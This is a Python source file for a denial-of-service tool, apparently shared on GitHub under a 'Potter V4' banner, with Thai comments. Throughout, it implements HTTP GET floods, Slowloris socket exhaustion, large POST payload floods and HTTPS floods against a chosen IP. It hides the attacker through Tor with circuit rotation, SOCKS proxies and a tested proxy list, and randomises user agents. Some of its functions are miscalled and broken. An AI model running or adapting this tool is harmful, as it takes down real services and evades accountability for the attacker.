import socket
import threading
import argparse
import os
import random
import time
import socks
import ssl
import string
import requests

from stem import Signal
from stem.control import Controller
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

def datet():
    return datetime.today().date()

from colorama import Fore, Back, Style
fore_colors = {
	"black": Fore.BLACK,
	"red": Fore.RED,
	"green": Fore.GREEN,
	"yellow": Fore.YELLOW,
	"blue": Fore.BLUE,
	"magenta": Fore.MAGENTA,
	"cyan": Fore.CYAN,
	"white": Fore.WHITE,
	"reset": Fore.RESET
}

back_colors = {
	"black": Back.BLACK,
	"red": Back.RED,
	"green": Back.GREEN,
	"yellow": Back.YELLOW,
	"blue": Back.BLUE,
	"magenta": Back.MAGENTA,
	"cyan": Back.CYAN,
	"white": Back.WHITE,
	"reset": Back.RESET
}

styles = {
	"dim": Style.DIM,
	"normal": Style.NORMAL,
	"bright": Style.BRIGHT,
	"reset": Style.RESET_ALL
}

with open("user_agent/user_agent_lists.txt", 'r', encoding='utf-8') as file:
    user_agents = [line.strip() for line in file if line.strip()]

Y_ANSWER = ["Y", "y", "Yes", "YES", "Ye"]
N_ANSWER = ["N", "n", "No", "NO"]

lock = threading.Lock()
banner = f"""{fore_colors['yellow']}{styles['bright']}                                          
  ___    __         _   _   _              _        _   _          
=|_ _|= / _|___ ___| |=| |_| |_  ___   _ _| |_ _  _| |_| |_  _ __  
 =| | =|  _/ -_) -_) |=|  _| ' \/ -_)=| '_| ' \ || |  _| ' \| '  \ 
=|___|=|_| \___\___|_|= \__|_||_\___|=|_| |_||_\_, |\__|_||_|_|_|_|=
===============================================|__/{back_colors['green']}By.=Potter=V4====={back_colors['reset']} {styles['reset']}
>>{fore_colors['cyan']}Github:{fore_colors['reset']} {styles['bright']}https://github.com/Faminee777xxx/I-feel-the-rhythm{styles['reset']}
    {fore_colors['reset']}"""

help = f"""
{banner}
Options:                            What it do:

  -h, --help                    Show this help menu
  --ip <IP>                     Target IP
  -p, --port <PORT>             Target Port (default: 80)
  -ths, --threads <N>           Number of threads (default: 100)
  -num-socks -n-socks           Number of Socks   (default: 1000)
  -ra, --random-agent           Random User-Agent

  \Mode Payload (Can use with tor&proxy)
  //-payloada, --payload-attack     Send a JSON file to server
  //--set-size-payload -set-p       Set Size of payload (default: 51200:50KB)
  //--set-msg-payload               Set message of payload
  //--random-payload                Randomized payload (Number)
 
  \Mode Slowloris (Can use with tor&proxy)
  //-slowa, --slowloris-attack    Perform Slowloris attack

  \Mode Tor & Proxy (U can use with Slowloris and Payload Mode)
    \TOR
  //--tor-ip                      Use TOR IP
  //--tor-port                    Use TOR Port
  //--change-tor-ip -c-tor-ip     Change Tor ip when Attacking
    \Proxy
  //--proxy-ip <IP>                 Use proxy IP
  //--proxy-port <PORT>             Use proxy Port
  //--proxy-list <proxy_list.txt>   Use more proxys
    //--check-proxy-list            Check proxy in proxy list
    """

def clear_terminal():
    os.system("clear")

def banner_when_attack(ip, port, threads, ran):
    print(banner)
    print(f"""
Target Information+-+-+-+-+-+-+-+-+-+-+-+
  {back_colors['magenta']}IP Address{back_colors['reset']}   : {ip}
  {back_colors['magenta']}Port{back_colors['reset']}         : {port}

Attack Parameters+-+-+-+-+-+-+-+-+-+-+-+-+
  {back_colors['magenta']}Threads{back_colors['reset']}      : {threads}
  {back_colors['magenta']}Random UA{back_colors['reset']}    : {ran}
  {back_colors['magenta']}Sockets{back_colors['reset']}      : {num_sockets}
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
{back_colors['green']}{styles['bright']}[+] Packet sent...{back_colors['reset']}
{back_colors['red']}[!] Press Ctrl+C to {styles['bright']}exit{back_colors['reset']}{back_colors['red']}{styles['reset']}
""")
    # clear_terminal()

parser = argparse.ArgumentParser(description=banner, add_help=False)
parser.add_argument("-h", "--help", action='store_true', dest="help_menu", required=False, help="Help menu")
parser.add_argument("--ip", required=False, default="127.0.0.1", help="Target IP")  # ใช้ --ip แทน -ip=
parser.add_argument("-p", "--port", type=int, required=False, default=80, help="Target Port number")  # รองรับ -p หรือ --port
parser.add_argument("-ths", "--threads", type=int, default=100, help="Number of threads to use")
parser.add_argument("--num-socks", "-n-socks", type=int, required=False, default=1000, help="Number of Socks to use (default: 1000)")
parser.add_argument("-ra", "--random-agent", action='store_true', required=False, help="Random User agent")
parser.add_argument("-slowa", "--slowloris-attack", action='store_true', required=False, help="Slowloris Attack")

# Send Payload
parser.add_argument("-payloada", "--payload-attack", required=False, action='store_true' ,help="Send a json file to server")
parser.add_argument("--set-size-payload", "-set-p", required=False, type=int, default=51200, help="Custom Size of payload (Default: 51200:50KB)")
parser.add_argument("--set-msg-payload", required=False, type=str, help="Set message payload")
parser.add_argument("--random-payload", required=False, action='store_true', help="Randomized payload")

# Proxy
parser.add_argument("--proxy-ip", required=False, help="Use proxy (ip)")
parser.add_argument("--proxy-port", required=False, type=int, help="Use proxy (port)")
parser.add_argument("--proxy-list", required=False, type=str, help="Use proxylists> ip:port")
parser.add_argument("--check-proxy-list", required=False, action='store_true', help="Check all proxys in lists")

# Tor
parser.add_argument("--tor-ip", required=False, help="Use Tor (ip)")
parser.add_argument("--tor-port", required=False, type=int, help="Use Tor (port)")
parser.add_argument("-c-tor-ip", "--change-tor-ip", required=False, action='store_true', help="Change Tor ip")


args = parser.parse_args()

help_menu = args.help_menu
target_ip = args.ip
port_target = args.port
num_thread = args.threads
num_sockets = args.num_socks
random_user_agent = args.random_agent

# Payload
payload_req = args.payload_attack
custom_payload = args.set_size_payload
msg_of_payload = args.set_msg_payload
random_payload = args.random_payload


# Proxy
proxy_ip = args.proxy_ip
proxy_port = args.proxy_port
proxy_lists = args.proxy_list
proxy_check = args.check_proxy_list

# Tor
tor_ip = args.tor_ip
tor_port = args.tor_port
change_tor = args.change_tor_ip


def want_to_continue():
    while True:
        wanna = input(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Do you want to continue?(Y/n):{styles['reset']} ")
        if wanna in Y_ANSWER:
            time.sleep(2)
        elif wanna in N_ANSWER:
            time.sleep(2)
            exit()
        else:
            print(f"[{back_colors['red']}?{back_colors['reset']}] {styles['bright']}What try again(Y/N){styles['reset']}\n")

def check_target(target_ip, target_port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target_ip, target_port))
        s.close()
        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Target {target_ip}:{target_port} is reachable and open.{styles['reset']}")
        return True
    except socket.timeout:
        print(f"[{back_colors['yellow']}!{back_colors['reset']} {styles['bright']}Timeout: {target_ip}:{target_port} not responding.{styles['reset']}")
    except socket.error as e:
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Connection failed: {e}{styles['reset']}")
    return False


# Check tor
def check_tor_running(ip="127.0.0.1", port=9050):
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, ip, port)
        s.settimeout(5)
        # ลองเชื่อมต่อไปที่ onion service ที่รู้จัก (DuckDuckGo)
        s.connect(("duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion", 80))
        s.close()
        return True
    except Exception as e:
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Tor is not running or not reachable: {e}{styles['reset']}")
        return False

# change tor ip
def change_tor_ip(control_port=9051):
    try:
        with Controller.from_port(port=control_port) as controller:
            controller.authenticate()  # ถ้าใช้ CookieAuthentication ไม่ต้องใส่รหัส
            controller.signal(Signal.NEWNYM)
            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor IP changed successfully!")
    except Exception as e:
        print(f"[{back_colors['red']}!{back_colors['reset']}] Failed to change Tor IP: {styles['bright']}{e}{styles['reset']}")



sockets_list = []
def main_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, port_target))

            if args.random_agent:
                user_agent = random.choice(user_agents)
            else:
                user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"

            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: close\r\n\r\n"
            )

            s.send(request.encode())
            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Packet sent: user-agent > {user_agent}{styles['reset']}")
            s.close()
        except Exception as e:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")

sockets = []

def create_socket():
    s = socks.socksocket()  # สร้าง socket ผ่าน PySocks
    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    s.settimeout(4)
    s.connect((target_ip, port_target))
    if args.random_agent:
        user_agent = random.choice(user_agents)
    else:
        user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
    s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n".encode())
    return s

def slowloris_attack_with_proxy():
    print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Starting slowloris attack on {target_ip}:{port_target} via SOCKS5 proxy {proxy_ip}:{proxy_port} with {num_sockets} sockets{styles['reset']}")
    for _ in range(num_sockets):
        try:
            s = create_socket()
            sockets.append(s)
        except Exception as e:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Socket creation failed: {e}{styles['reset']}")

    while True:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                sockets.remove(s)
                try:
                    new_s = create_socket()
                    sockets.append(new_s)
                except Exception as e:
                    err_msg = str(e)
                    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {err_msg}{styles['reset']}")
        time.sleep(10)



# ฟังก์ชันสร้าง socket ผ่าน proxy
def create_socket_via_proxy(proxy_ip_port):
    proxy_ip, proxy_port = proxy_ip_port.split(":")
    proxy_port = int(proxy_port)
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    s.settimeout(5)
    s.connect((target_ip, port_target))
    user_agent = random.choice(user_agents)
    http_get = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n"
    s.send(http_get.encode())
    return s

def slowloris_with_proxy_list(proxy_ip_port):
    sockets = []
    # สร้าง socket เริ่มต้น
    for _ in range(num_sockets):
        try:
            s = create_socket_via_proxy(proxy_ip_port)
            sockets.append(s)
        except Exception as e:
            print(f"[FAIL] สร้าง socket ผ่าน proxy {proxy_ip_port} ไม่ได้: {e}")

    print(f"[INFO] เริ่มโจมตีด้วย proxy {proxy_ip_port} จำนวน socket: {len(sockets)}")

    while True:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                sockets.remove(s)
                try:
                    new_s = create_socket_via_proxy(proxy_ip_port)
                    sockets.append(new_s)
                except Exception as e:
                    print(f"[FAIL] สร้าง socket ใหม่ผ่าน proxy {proxy_ip_port} ไม่ได้: {e}")
        time.sleep(10)

# proxy_list_attack
def load_proxies():
    with open(proxy_lists, "r") as f:
        return [line.strip() for line in f if line.strip()]

def test_proxy(proxy):
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }
    try:
        response = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
        if response.status_code == 200:
            print(f"[{back_colors['green']}OK{back_colors['reset']}] {styles['bright']}Proxy {proxy} =>{styles['reset']} {response.json()}\n")
            return True
        else:
            print(f"[{back_colors['red']}FAIL{styles['reset']}] Proxy {styles['bright']}{proxy}{styles['reset']} => {styles['bright']}{e}{styles['reset']}\n")
            return False
    except Exception as e:
        print(f"[{back_colors['red']}FAIL{styles['reset']}] Proxy {styles['bright']}{proxy}{styles['reset']} => {styles['bright']}{e}{styles['reset']}\n")
        return False
    

# โหมดสุ่ม proxy
def use_random_proxy(proxies):
    proxy = random.choice(proxies)
    test_proxy(proxy)

# โหมดวนลูป proxy ทีละตัว
def use_all_proxies(proxies):
    for proxy in proxies:
        test_proxy(proxy)
        time.sleep(1)  # พัก 1 วินาทีระหว่างการทดสอบ

def filter_proxies(proxy_list):
    working_proxies = []
    for proxy in proxy_list:
        proxy = proxy.strip()
        if use_all_proxies(proxy):
            working_proxies.append(proxy)
    return working_proxies


def create_socket_tor():
    s = socks.socksocket()  # สร้าง socket ผ่าน PySocks
    s.set_proxy(socks.SOCKS5, tor_ip, tor_port, rdns=True)  # rdns=True = เหมือน SOCKS5H
    s.settimeout(4)
    s.connect((target_ip, port_target))
    if args.random_agent:
        user_agent = random.choice(user_agents)
    else:
        user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
    path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
    s.send(f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n".encode())
    return s

def slowloris_attack_with_tor():
    print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Starting slowloris attack on {target_ip}:{port_target} via Tor at {tor_ip}:{tor_port} with {num_sockets} sockets{styles['reset']}")
    for _ in range(num_sockets):
        try:
            s = create_socket_tor()
            sockets.append(s)
        except Exception as e:
            print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Socket creation failed: {e}{styles['reset']}")

    while True:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                sockets.remove(s)
                try:
                    new_s = create_socket_tor()
                    sockets.append(new_s)
                except Exception as e:
                    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {e}{styles['reset']}")
        time.sleep(10)


# Normal SLOWRIS-ATTACK _START_
def init_socket_normal():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, port_target))
        ua = random.choice(user_agents)
        s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\n".encode())
        sockets_list.append(s)
    except Exception as e:
        err_msg = str(e)
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Socket init failed: {err_msg}{styles['reset']}")
        if "No route to host" in err_msg:
            print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Target not reachable - waiting before retry...{styles['reset']}")
            time.sleep(5)  # รอ 5 วินาทีแล้วลองใหม่
        elif "timed out" in err_msg.lower():
            time.sleep(1)  # รอสั้น ๆ แล้วลองใหม่
        else:
            time.sleep(0.5)  # default wait

def slowloris_attack_normal():
    print(f"[{back_colors['green']}+{back_colors['reset']}] {styles["bright"]}Initializing {num_sockets} sockets...{styles['reset']}")
    for _ in range(num_sockets):
        init_socket_normal()
        time.sleep(0.01)

    while True:
        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sending keep-alive headers to {len(sockets_list)} sockets{styles['reset']}")
        for s in sockets_list[:]:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                with lock:
                    if s in sockets_list:
                        sockets_list.remove(s)
                try:
                    new_s = init_socket_normal()
                    with lock:
                        sockets_list.append(new_s)
                except Exception as e:
                    err_msg = str(e)
                    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {err_msg}{styles['reset']}")
                    if "No route to host" in err_msg:
                        print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Target not reachable - waiting before retry...{styles['reset']}")
                        time.sleep(5)  # รอ 5 วินาทีแล้วลองใหม่
                    elif "timed out" in err_msg.lower():
                        time.sleep(1)  # รอสั้น ๆ แล้วลองใหม่
                    else:
                        time.sleep(0.5)  # default wait


        # เติม socket ใหม่
        missing = num_sockets - len(sockets_list)
        for _ in range(missing):
            init_socket_normal()

        time.sleep(10)
# Normal SLOWRIS-ATTACK _END_

# Payload Attack _START_
if args.random_payload:
    size_of_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=args.set_size_payload))
elif args.set_msg_payload:
    size_of_payload = args.set_msg_payload * args.set_size_payload
else:
    size_of_payload = "A" * args.set_size_payload  # 50 KBbig_payload = "A" * 51200  # 50 KB

def send_payload(use_tor=False, proxy_ip=None, proxy_port=None):
    while True:
        try:
            if use_tor:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, tor_ip, tor_port, rdns=True)
            elif proxy_ip and proxy_port:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(5)
            s.connect((target_ip, port_target))

            if args.random_agent:
                user_agent = random.choice(user_agents)
            else:
                user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"

            req = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Content-Length: {len(size_of_payload)}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"{size_of_payload}"
            )
            s.sendall(req.encode())
            s.close()
            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sended Payload{styles['reset']}")
            time.sleep(0.1)

        except socket.timeout:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Timeout while sending payload{styles['reset']}")
            try:
                s.close()
            except:
                pass
            time.sleep(1)
        except Exception as e:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error sending payload: {e}")
            try:
                s.close()
            except:
                pass
            time.sleep(1)

def send_payload_with_proxy_list(proxy_ip_port=None):
    while True:
        try:
            if proxy_ip_port:
                proxy_ip, proxy_port = proxy_ip_port.split(":")
                proxy_port = int(proxy_port)
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(5)
            s.connect((target_ip, port_target))

            user_agent = random.choice(user_agents)

            req = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Content-Length: {len(size_of_payload)}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"{size_of_payload}"
            )
            s.sendall(req.encode())
            s.close()
            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sended payload via proxy {proxy_ip_port if proxy_ip_port else 'direct connection'}{styles['normal']}")
            time.sleep(0.1)

        except socket.timeout:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Timeout while sending payload{styles['reset']}")
            try:
                s.close()
            except:
                pass
            time.sleep(1)
        except Exception as e:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error sending payload: {e}")
            try:
                s.close()
            except:
                pass
            time.sleep(1)

def https_attack():
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(3)
        raw_sock.connect((target_ip, port_target))

        context = ssl.create_default_context()
        s = context.wrap_socket(raw_sock, server_hostname=target_ip)

        # เลือก user-agent แบบสุ่ม
        if args.random_agent:
                user_agent = random.choice(user_agents)
        else:
            user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"

        # สร้าง HTTPS request
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Connection: close\r\n\r\n"
        )

        s.send(request.encode())
        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sent HTTPS request with UA: {user_agent}{styles['reset']}")
        s.close()

    except Exception as e:
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")

# Start attack
# Check Help
if args.help_menu:
    print(help)
    exit()
else:
    pass

if check_target(target_ip, port_target):
    threads = []
    if args.random_agent:
        rand_ua = True
    else:
        rand_ua = False

    banner_when_attack(target_ip, port_target, num_thread, rand_ua)
    print(f"[{back_colors['green']}*{back_colors['reset']}] {styles['bright']}Checking...{styles['reset']}")
    time.sleep(1)
    for i in range(num_thread):
        # TOR Attack (slowloris)
        if args.slowloris_attack and args.tor_ip and args.tor_port:
            if check_tor_running():
                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor is running and reachable{styles['reset']}")
                time.sleep(3)
                t = threading.Thread(target=slowloris_attack_with_tor, daemon=True)
                if args.change_tor_ip:
                    time.sleep(5)
                    change_tor_ip()
                    print(f"\n{styles['bright']}** Changeing Tor IP it will take ({back_colors['cyan']}10s/per 1 IP{back_colors['reset']}) **{styles['reset']}")
                    time.sleep(10)

            else:
                print(f"\n[{back_colors['red']}!{back_colors['reset']}] Please start {styles['bright']}Tor{styles['reset']} before running this script: tor")
                time.sleep(3)

                exit()
            

        # Proxy Attack (Slowloris)
        elif args.slowloris_attack and args.proxy_ip and args.proxy_port:
            t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
        
        elif args.slowloris_attack and args.proxy_list:
            #print("DEBUG: payload_attack:", args.payload_attack)
            #print("DEBUG: proxy_list:", args.proxy_list)
            #print("DEBUG: check_proxy_list:", args.check_proxy_list)
            if args.check_proxy_list:
                proxy_list = load_proxies()
                print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
                # Check all proxys in list
                use_all_proxies(proxy_list)
                want_to_continue()

                good_proxies = filter_proxies(proxy_list)
                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Proxy that can actually be used{styles['reset']}, StatusCode: {back_colors['green']}200{back_colors['reset']}")
                for p in good_proxies:
                    print(p)
                date = datet()
                file_output = f"working_proxies_{date}.txt"
                with open(file_output, "w") as f:
                    for p in good_proxies:
                        f.write(p + "\n")

            else:
                pass
            # โหลด proxy list จากไฟล์
            if args.check_proxy_list:
                with open(file_output, "r") as f:
                    proxies = [line.strip() for line in f if line.strip()]
            else:
                proxies = load_proxies()

            for proxy in proxies:
                t = threading.Thread(target=slowloris_with_proxy_list, args=(proxy,))
                t.daemon = True
                t.start()
                threads.append(t)

            # รัน thread ไปเรื่อย ๆ
            for t in threads:
                t.join()

        # Slowloris Attack_Normal
        elif args.slowloris_attack:
            t = threading.Thread(target=slowloris_attack_normal, daemon=True)


        # Payload Attack
        elif args.payload_attack:
                
            if args.proxy_ip and args.proxy_port:
                send_payload(proxyip=args.proxy_ip, proxy_p=args.proxy_port)
            elif args.tor_ip and args.tor_port:
                if check_tor_running():
                    print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor is running and reachable{styles['reset']}")
                    time.sleep(3)
                    send_payload(use_tor=True)
                    if args.change_tor_ip:
                        time.sleep(5)
                        change_tor_ip()
                        print(f"\n{styles['bright']}** Changeing Tor IP it will take ({back_colors['cyan']}10s/per 1 IP{back_colors['reset']}) **{styles['reset']}")
                        time.sleep(10)
                else:
                    print(f"\n[{back_colors['red']}!{back_colors['reset']}] Please start {styles['bright']}Tor{styles['reset']} before running this script: tor")
                    time.sleep(3)

                    exit()
            
            else:
                send_payload()
            
            t = threading.Thread(target=send_payload, daemon=True)
        if args.payload_attack and args.proxy_list:
            if args.check_proxy_list:
                proxy_list = load_proxies()
                print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
                use_all_proxies(proxy_list)
                want_to_continue()

                good_proxies = filter_proxies(proxy_list)
                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Proxy that can actually be used{styles['reset']}, StatusCode: {back_colors['green']}200{back_colors['reset']}")
                for p in good_proxies:
                    print(p)
                date = datet()
                file_output = f"working_proxies_{date}.txt"
                with open(file_output, "w") as f:
                    for p in good_proxies:
                        f.write(p + "\n")

                # โหลด proxy จากไฟล์ที่เพิ่งเซฟ
                with open(file_output, "r") as f:
                    proxies = [line.strip() for line in f if line.strip()]

            else:
                proxies = load_proxies()

            # เริ่มยิง payload
            for proxy in proxies:
                t = threading.Thread(target=send_payload, args=(proxy,))
                t.daemon = True
                t.start()
                threads.append(t)

            for t in threads:
                t.join()
        # Https Attak
        elif args.port == 443:
            t = threading.Thread(target=https_attack, daemon=True)

        else:
            t = threading.Thread(target=main_attack, daemon=True)
        t.start()
    while True:
        time.sleep(1)

else:
    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Target not reachable. Aborting.{styles['reset']}")
